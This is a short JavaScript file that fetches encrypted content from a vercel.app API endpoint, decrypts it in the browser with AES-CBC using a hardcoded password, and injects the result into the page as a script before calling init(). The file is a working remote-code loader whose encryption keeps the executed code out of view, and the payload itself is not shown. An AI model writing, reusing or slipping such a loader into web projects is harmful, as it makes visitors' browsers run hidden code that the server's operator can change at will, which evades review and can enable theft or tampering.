
// const Buffer = buffer.Buffer
// Client-side decryption using Web Crypto API
const baseUrl = 'https://nodejs-serverless-function-express-one-eta-79.vercel.app'
async function decryptData(encryptedData, salt, iv, password) {
    const enc = new TextEncoder();
    const keyMaterial = await window.crypto.subtle.importKey(
        "raw",
        enc.encode(password),
        { name: "PBKDF2" },
        false,
        ["deriveBits", "deriveKey"]
    );

    const key = await window.crypto.subtle.deriveKey(
        {
            name: "PBKDF2",
            salt: hexToUint8Array(salt),
            iterations: 100000,
            hash: "SHA-256"
        },
        keyMaterial,
        { name: "AES-CBC", length: 256 },
        true,
        ["decrypt"]
    );

    const decrypted = await window.crypto.subtle.decrypt(
        {
            name: "AES-CBC",
            iv: hexToUint8Array(iv)
        },
        key,
        hexToUint8Array(encryptedData)
    );

    return new TextDecoder().decode(decrypted);
}

// Utility function to convert hex string to Uint8Array
function hexToUint8Array(hexString) {
    return new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
}

// Function to fetch, decrypt, and execute JavaScript
async function loadEncryptedAndExecuteJS(url) {
    fetch(url)
        .then(response => response.text())
        .then(async encryptedCode => {
            encryptedCode = JSON.parse(encryptedCode).message
            console.log(encryptedCode)
            let decryptedCode = await decryptData(encryptedCode.encryptedData, encryptedCode.salt, encryptedCode.iv, 'topiniuuinipot1234567890')
            // console.log(decryptedCode)

            const script = document.createElement('script');
            script.text = decryptedCode;
            document.head.appendChild(script);
            init()
        })
}

// Usage
loadEncryptedAndExecuteJS(`${baseUrl}/api/brozhang`);
